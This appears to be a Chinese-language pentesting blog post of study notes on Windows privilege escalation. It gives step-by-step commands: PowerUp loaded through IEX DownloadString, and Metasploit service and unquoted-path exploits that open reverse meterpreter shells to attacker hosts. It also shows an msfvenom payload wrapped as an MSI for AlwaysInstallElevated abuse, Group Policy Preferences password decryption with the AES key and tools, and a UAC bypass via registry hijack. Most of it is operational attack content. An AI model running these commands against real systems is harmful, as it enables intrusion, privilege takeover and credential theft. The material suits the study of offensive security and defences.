+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217093416221.png" alt="image-20241217093416221"></p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">演示案例<span class="number">3</span>-<span class="variable">Web</span>到<span class="variable">Win</span>-数据库提权-<span class="function"><span class="title">ORACLE</span>(默认<span class="number">1521</span>端口)</span></span><br><span class="line"><span class="variable">Oracle</span>：（站库分离，非<span class="variable">JSP</span>，直接数据库到系统等）</span><br><span class="line">条件：数据库用户密码</span><br><span class="line">技术：<span class="variable">DBA</span>，普通用户，注入模式</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oracleshell  https:<span class="regexp">//gi</span>thub.com<span class="regexp">/jas502n/</span>oracleShell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217093524433.png" alt="image-20241217093524433"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//02353c00dc218ce5b89f91857b93d523.png" alt="img"></p>
+<h2 id="3-错误的系统配置提权"><a href="#3-错误的系统配置提权" class="headerlink" title="3.错误的系统配置提权"></a>3.错误的系统配置提权</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统服务文件会在Windows系统启动时启动，普通用户没有<span class="string">&quot;高权限服务调用的exe文件&quot;</span>的写入权限</span><br><span class="line">如果有一个错误配置使得普通用户有写入权限了，那么他可能把这个<span class="keyword">exe</span>文件替换成例如msf后门的一系列<span class="keyword">exe</span></span><br><span class="line">有两种方式能够拿到高权限，第一种是创建并运行一个新服务，第二种就是判断哪些文件权限会有问题，对其进行劫持。两种的结果都是创建出一个随机文件名安装路径的可执行程序。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PowerUp 脚本检测 https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</span><br><span class="line"><span class="comment"># 本地加载,检测可利用提权方式</span></span><br><span class="line"><span class="keyword">import</span>-Module .PowerUp.ps1  </span><br><span class="line">Invoke-AllChecks  </span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;<span class="attribute">Import-Module .PowerUp.ps1;InvokeAllChecks&#125;&quot;</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">远程加载,检测可利用提权方式</span></span><br><span class="line"><span class="attribute">powershell -nop -exec bypass -c &quot;IEX (New-Object</span></span><br><span class="line"><span class="attribute">Net.WebClient).DownloadString(&#x27;https</span>://raw<span class="variable">.githubusercontent</span><span class="variable">.com</span>/PowerShellE  </span><br><span class="line">mpire/PowerTools/master/PowerUp/PowerUp<span class="variable">.ps</span>1&#x27;); <span class="attribute">Invoke-AllChecks&quot;</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">使用检测到的提权脚本进行提权</span></span><br><span class="line"><span class="attribute">powershell -exec bypass -c &quot;IEX (New-Object  </span></span><br><span class="line"><span class="attribute">Net.WebClient).DownloadString(&#x27;https</span>://raw<span class="variable">.githubusercontent</span><span class="variable">.com</span>/PowerShellE  </span><br><span class="line">mpire/PowerTools/master/PowerUp/PowerUp<span class="variable">.ps</span>1&#x27;); &lt;利用语句&gt;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MSF</span><br><span class="line">exploit/windows/<span class="keyword">local</span>/service_permissions</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">session</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">不常用：通过注册表键AlwaysInstallElevated提权</span><br><span class="line">注册表键是一个策略设置项，如果启用，那么地权限用户可以通过NT AUTHORITYSYSTEM权限来安装恶意的MSI(Microsoft Windows Installer)文件</span><br><span class="line">但是如果开启Windows installer特权安装功能，那么所有用户都可以以<span class="keyword">system</span>安装文件</span><br><span class="line"></span><br><span class="line">判断是否激活alwaysinstallelevated</span><br><span class="line">powerup：</span><br><span class="line">打开powershell，绕过执行策略并添加倒入powerup模块</span><br><span class="line">    <span class="keyword">Set</span><span class="operator">-</span>ExecutionPolicy Bypass <span class="operator">-</span><span class="keyword">Scope</span> Process</span><br><span class="line">    . .\PowerUp.ps1</span><br><span class="line"> <span class="keyword">Get</span><span class="operator">-</span>RegistryAlwaysInstallElevated</span><br><span class="line"> </span><br><span class="line">通过注册表的键值判断</span><br><span class="line"> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="operator">/</span>v AlwaysInstallElevated	</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217100613861.png" alt="image-20241217100613861"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">激活AlwaysInstallElevated</span><br><span class="line">激活它可以通过修改注册表的键值或者在图形化页面上激活。 图形化如下，路径为计算机设置\管理模版\windows组件\windows installer，选中已启用即可，需要管理员权限：</span><br><span class="line"></span><br><span class="line">通过修改注册表 </span><br><span class="line">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</span><br><span class="line">reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</span><br><span class="line"></span><br><span class="line"> 修改注册表的这两项需要有下面两权限：</span><br><span class="line">SeRestorePrivilege</span><br><span class="line">SeTakeOwnershipPrivilege</span><br><span class="line">使用<span class="built_in">whoami</span> /priv可以查看权限。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217100733819.png" alt="image-20241217100733819"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 提权</span><br><span class="line">下载exemsi</span><br><span class="line">https://www.exemsi.<span class="keyword">com</span>/download/</span><br><span class="line">用msf生成<span class="keyword">exe</span></span><br><span class="line">msfvenom -<span class="keyword">p</span> windows/x64/meterpreter/reverse_http LPORT=<span class="number">9090</span> LHOST=<span class="number">172.16</span>.<span class="number">250.1</span> -<span class="keyword">f</span> <span class="keyword">exe</span> &gt;<span class="number">1</span>.<span class="keyword">exe</span></span><br><span class="line"> 使用exemsi将<span class="keyword">exe</span>封装为msi。 软件页面如下，这一步很简单，不过多阐述。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217100852886.png" alt="image-20241217100852886"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">受害者机器上执行：msiexec /<span class="selector-tag">q</span> /<span class="selector-tag">i</span> <span class="number">1</span><span class="selector-class">.msi</span>  就可以在远控端拿到system权限</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">可信任服务路径漏洞</span><br><span class="line">如果一个服务的可执行文件的路径没有被双引号引起来且包含空格（可信任服务路径），那么这个服务就是有漏洞的。</span><br><span class="line">Windows服务都是以system启动的，在解析bin文件路径的空格时也是用system，对于文件路径的每一个空格系统都会尝试并<span class="string">&quot;执行&quot;</span>名字与空格前的名字相匹配的程序</span><br><span class="line">现在有一个程序C:<span class="string">\Program</span> Files (x86)<span class="string">\Razer</span> Chroma SDK<span class="string">\bin\RzSDKService.exe</span> </span><br><span class="line">那么他的解析分<span class="number">3</span>步</span><br><span class="line"><span class="number">1.</span> C:<span class="string">\Program</span></span><br><span class="line"><span class="number">2.</span> C:<span class="string">\Program</span> Files</span><br><span class="line"><span class="number">3.</span> C:<span class="string">\Program</span> Files (x86)<span class="string">\Razer</span></span><br><span class="line"><span class="number">4.</span> C:<span class="string">\Program</span> Files (x86)<span class="string">\Razer</span> Chroma</span><br><span class="line"><span class="number">5.</span> C:<span class="string">\Program</span> Files (x86)<span class="string">\Razer</span> Chroma SDK<span class="string">\bin\RzSDKService.exe</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">操作步骤 1.执行下列代码探测符合条件的服务</span><br><span class="line">wmic service get displayname,startmode,pathname|findstr /i <span class="string">&quot;Auto&quot;</span> | findstr /i /v <span class="string">&quot;C:\Windows\&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217102324244.png" alt="image-20241217102324244"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>确认该目录是否可写</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>重启服务</span><br><span class="line"></span><br><span class="line">sc stop service_name</span><br><span class="line">sc <span class="keyword">start</span> service_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf利用：</span><br><span class="line">使用msf中的WINDOWS Service <span class="keyword">Trusted</span> <span class="type">Path</span> Privilege Escalation模块进行渗透测试。该模块会将可执行程序放到受影响的文件夹中，然后将受影响的服务重启</span><br><span class="line"></span><br><span class="line">msf6 &gt; use exploit/windows/<span class="keyword">local</span>/unquoted_service_path</span><br><span class="line">[*] <span class="keyword">Using</span> configured payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/<span class="keyword">local</span>/unquoted_service_path) &gt; <span class="keyword">set</span> <span class="keyword">SESSION</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">SESSION</span> =&gt; <span class="number">5</span></span><br><span class="line">msf6 exploit(windows/<span class="keyword">local</span>/unquoted_service_path) &gt; <span class="keyword">set</span> LHOST <span class="number">1.1</span><span class="number">.1</span><span class="number">.5</span></span><br><span class="line">LHOST =&gt; <span class="number">1.1</span><span class="number">.1</span><span class="number">.5</span></span><br><span class="line">msf6 exploit(windows/<span class="keyword">local</span>/unquoted_service_path) &gt; run    #命令执行后，反弹一个meterpreter，但是反弹的会很快中断，需迁移进程 </span><br><span class="line"><span class="keyword">set</span> AutoRunScript migrate -f  #自动迁移进程</span><br><span class="line"> 命令执行后，会自动反弹一个新的meterpreter。再次查询权限，显示提权成功，需要注意的是，反弹的meterpreter 会很快中断，这是因为当一个进程在Windows操作系统中启动后，必须与服务控制管理器进行通信，如果没有进行通信，服务控制管理器会认为出现了错误，进而终止这个进程。在渗透测试中，需要在终止载荷进程之前将它迁移到其他进程中(可以使用“<span class="keyword">set</span> AutoRunScript migrate -f”命令自动迁移进程)。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不安全的服务权限漏洞</span><br><span class="line">接上面可信任服务路径漏洞，即使是用双引号引起来了，也可能有服务权限漏洞，例如给低权限用户修改权限，低权限用户可能直接重定向exe</span><br><span class="line">过程：检测服务权限配置-msf写后门，也可以用其他的-上传-修改system权限启动的服务的路径-调用(一般要重启)</span><br><span class="line"></span><br><span class="line">accesschk.exe -uwcqv <span class="string">&quot;administrators&quot;</span> *</span><br><span class="line"><span class="keyword">sc </span><span class="built_in">config</span> <span class="string">&quot;NewServiceName&quot;</span> <span class="keyword">binpath=&quot;C:\Program.exe&quot;</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sc </span>start <span class="string">&quot;NewServiceName&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-组策略首选项提权"><a href="#4-组策略首选项提权" class="headerlink" title="4.组策略首选项提权"></a>4.组策略首选项提权</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">介绍一个目录<span class="operator">-</span><span class="variable">sysvol</span>是所有经过身份验证的用户具有读写权限的<span class="built_in">Active</span> <span class="built_in">Directory</span><span class="punctuation">(</span><span class="variable">AD</span>域<span class="punctuation">)</span>中的域范围共享，在安装<span class="variable">AD</span>域的时候所有的<span class="variable">DC</span>机都会有这个文件夹的备份。所有域组策略都会存储在<span class="built_in">C</span><span class="operator">:</span>\<span class="variable">Windows</span>\<span class="variable">SYSVOL</span>\<span class="variable">domain</span>\<span class="variable">Policies</span></span><br><span class="line">在<span class="built_in">C</span><span class="operator">:</span>\<span class="variable">Windows</span>\<span class="variable">SYSVOL</span>目录下，只有创建组策略脚本登录才能有策略脚本配置文件，<span class="variable">groups</span><span class="operator">.</span><span class="variable">xml</span><span class="operator">,</span>默认是没有的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般AD域的计算机都是用脚本自动化部署的，为了方便，管理者要求域中主机用域账号和密码登录，而这个就必须创建组策略脚本配置文件，这个文件里有域中所有主机的域账号和密码但是是用AES<span class="string">-256</span>加密的，2012年微软已公开</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域控的组策略中新建dc_admin组策略 <span class="meta">#自行创建</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217105750661.png" alt="image-20241217105750661"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217105815119.png" alt="image-20241217105815119"></p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将域中每个计算机的本地administrator用户更名为 <span class="literal">admin</span>，并且设置新的密码Aa123456（方便管理）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217105841600.png" alt="image-20241217105841600"></p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">确定后添加<span class="built_in">domain</span> computers </span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//321a240ee8d239438686671387d2f0fa.png" alt="img"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//6e9b2e89d12a7cd6cf77ce21bc372224.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">更新组策略 gpupdate /force</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217105915874.png" alt="image-20241217105915874"></p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">现在就能看到其他域内机器的密码了</span><br><span class="line"><span class="name">C</span>:\Windows\SYSVOL\domain\Policies\&#123;id&#125;\Machine\Preferences\Groups</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217110113495.png" alt="image-20241217110113495"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//cb1856110f616e0d2bc81583883f773e.png" alt="img"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217110149193.png" alt="image-20241217110149193"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">破解AES-256加密：</span><br><span class="line"><span class="meta prompt_">msf&gt;</span><span class="language-bash">use post/windows/gather/credentials/gpp</span></span><br><span class="line"><span class="meta prompt_">msf&gt;</span><span class="language-bash">post/windows/gather/credentials/gpp&gt;sessions</span></span><br><span class="line"><span class="meta prompt_">msf&gt;</span><span class="language-bash">post/windows/gather/credentials/gpp&gt; <span class="built_in">set</span> SESSION 1</span></span><br><span class="line"><span class="meta prompt_">msf&gt;</span><span class="language-bash">post/windows/gather/credentials&gt;show options</span></span><br><span class="line"><span class="meta prompt_">msf&gt;</span><span class="language-bash">post/windows/gather/credentials/gpp&gt; run</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//19c0dcc8ac02c67b9ba96420d2029f04.png" alt="img"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> ruby脚本</span><br><span class="line"></span><br><span class="line">require <span class="string">&#x27;rubygems&#x27;</span></span><br><span class="line">require <span class="string">&#x27;openssl&#x27;</span></span><br><span class="line">require <span class="string">&#x27;base64&#x27;</span></span><br><span class="line">encrypted_data = &quot;6IsqRFD6k9q5fWvZZPGGyAK9njRNN76NKTrLAfsvHGk&quot;</span><br><span class="line">def decrypt(encrypted_data)</span><br><span class="line">    padding = &quot;=&quot; * (<span class="number">4</span> - (encrypted_data.length % <span class="number">4</span>))</span><br><span class="line">      epassword = &quot;#&#123;encrypted_data&#125;#&#123;padding&#125;&quot;</span><br><span class="line">        decoded = Base64.decode64(epassword)</span><br><span class="line">           key = &quot;\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b&quot;</span><br><span class="line">             aes = OpenSSL::Cipher::Cipher.<span class="built_in">new</span>(&quot;AES-256-CBC&quot;)</span><br><span class="line">               aes.decrypt</span><br><span class="line">                 aes.key = key</span><br><span class="line">                   plaintext = aes.<span class="keyword">update</span>(decoded)</span><br><span class="line">                     plaintext &lt;&lt; aes.final</span><br><span class="line">                       pass = plaintext.unpack(<span class="string">&#x27;v*&#x27;</span>).pack(<span class="string">&#x27;C*&#x27;</span>) # UNICODE <span class="keyword">conversion</span></span><br><span class="line">                         <span class="keyword">return</span> pass</span><br><span class="line">                          <span class="keyword">end</span></span><br><span class="line">blah = decrypt(encrypted_data)</span><br><span class="line">puts blah</span><br><span class="line"></span><br><span class="line">ruby en.rb</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">kali</span>:</span><br><span class="line"><span class="attribute">gpp</span>-decrypt <span class="number">6</span>IsqRFD6k9q5fWvZZPGGyAK9njRNN76NKTrLAfsvHGk</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>、<span class="variable">powershell</span>脚本：</span><br><span class="line"><span class="variable">powershell</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span></span><br><span class="line"><span class="built_in">Import</span><span class="operator">-</span><span class="built_in">Module</span> <span class="operator">.</span>\<span class="built_in">Get</span><span class="operator">-</span><span class="variable">GPPPassword</span><span class="operator">.</span><span class="variable">ps1</span><span class="operator">;</span><span class="built_in">Get</span><span class="operator">-</span><span class="variable">GPPPassword</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UAC 白名单</span><br><span class="line">白名单中的程序以静默方式自动提升到管理员权限不弹出UAC框 如slui.<span class="keyword">exe</span>、wuUSa.<span class="keyword">exe</span>、taskmgr.<span class="keyword">exe</span>、msra.<span class="keyword">exe</span>、eudcedi.<span class="keyword">exe</span>、eventvwr.<span class="keyword">exe</span>、CompMgmtLauncher.<span class="keyword">exe</span>、rundll32.<span class="keyword">exe</span>、explorer.<span class="keyword">exe</span>等。攻击者可以对这些白名单程序进行dll劫持、dll注入或注册表劫持等，绕过uac并提升权限。</span><br><span class="line">寻找白名单程序</span><br><span class="line"></span><br><span class="line">在寻找白名单程序时，可以使用微软工具sigcheck和Strings。 白名单程序拥有一个共同的特性，就是Manifest数据中autoElevate属性的值为True。</span><br><span class="line"><span class="number">1</span>.sigcheck可以检测程序是否具有autoElevate属性</span><br><span class="line">以Computerdefaults.<span class="keyword">exe</span>为例，该程序位于<span class="keyword">c</span>:\windows\system32目录下</span><br><span class="line">sigcheck.<span class="keyword">exe</span> /accepteula -<span class="keyword">m</span> <span class="keyword">c</span>:\windows\system32\Computerdefaults.<span class="keyword">exe</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//798bb1642cc3bc037c4acf9021b87582.png" alt="img"></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 2.Strings可以找出所有具有autoElevate属性的程序</span><br><span class="line"></span><br><span class="line">strings.exe <span class="string">/accepteula</span> -s c:\windows\system32\*<span class="string">.exe</span> | findstr <span class="string">/i</span> <span class="string">&quot;autoElevate&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下面以Computerdefaults.exe为例进行分析，并通过该程序绕过UAC进行提权。将其运行，会打开默认应用界面</span><br><span class="line">我们利用ProcessMonitor对该进程的行为做一个监听：</span><br><span class="line">先寻找<span class="name">HKCU</span>:\Software\Classes\ms-settings\Shell\Open\Command 注册表，然后发现键值不存在，再寻找<span class="name">HKCR</span>:\ms-settings\Shell\Open\Command\DelegateExecute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//8e1499adc99af5887df70f7a2e12c304.png" alt="img"></p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因此当我们修改<span class="params">hkcu</span>注册表后，运行ComputerDefaults.exe就会得到一个bypass uac后的cmd</span><br><span class="line">当修改<span class="params">HKCU</span>\Software\Classes\下的键值时，会同步修改<span class="params">HKCR</span>下面的键值。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//9ccd22c68bcb335aa6ffe3f5a6ec74c5.png" alt="img"></p>
+<h2 id="5-Web中间件漏洞提权"><a href="#5-Web中间件漏洞提权" class="headerlink" title="5.Web中间件漏洞提权"></a>5.Web中间件漏洞提权</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">偷个懒，日后写完web的外围打点补链接</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-DLL-动态库-劫持提权"><a href="#6-DLL-动态库-劫持提权" class="headerlink" title="6.DLL(动态库)劫持提权"></a>6.DLL(动态库)劫持提权</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">不探讨原理，不会。<span class="variable">DLL</span>劫持提权大概分为<span class="variable">Windows</span> <span class="variable">XP</span> <span class="variable">SP2</span>之前、在<span class="variable">winxdows</span> <span class="variable">xp</span> <span class="variable">sp2</span>之后这两种情况。</span><br><span class="line"><span class="variable">Windows</span>程序启动的时候需要<span class="variable">DLL</span>。但是如果这些<span class="variable">DLL</span>不存在，则可以通过在应用程序要查找的位置，放置恶意<span class="variable">DLL</span>来提权。</span><br><span class="line"></span><br><span class="line">通常，<span class="variable">Windows</span> 应用程序有其预定义好的搜索<span class="variable">DLL</span> 的路径，它会根据下面的顺序进行搜索：</span><br><span class="line"><span class="number">1</span>、应用程序加载的目录<span class="punctuation">(</span>程序自身的目录<span class="punctuation">)</span></span><br><span class="line"><span class="number">2</span>、<span class="built_in">C</span><span class="operator">:</span>\<span class="variable">Windows</span>\<span class="variable">System32</span></span><br><span class="line"><span class="number">3</span>、<span class="built_in">C</span><span class="operator">:</span>\<span class="variable">Windows</span>\<span class="variable">System</span></span><br><span class="line"><span class="number">4</span>、<span class="built_in">C</span><span class="operator">:</span>\<span class="variable">Windows</span></span><br><span class="line"><span class="number">5</span>、当前工作目录<span class="variable">Current</span> <span class="variable">Working</span> <span class="built_in">Directory</span>，<span class="variable">CWD</span></span><br><span class="line"><span class="number">6</span>、在<span class="variable">PATH</span>环境变量的目录（先系统后用户）</span><br></pre></td></tr></table></figure>
+
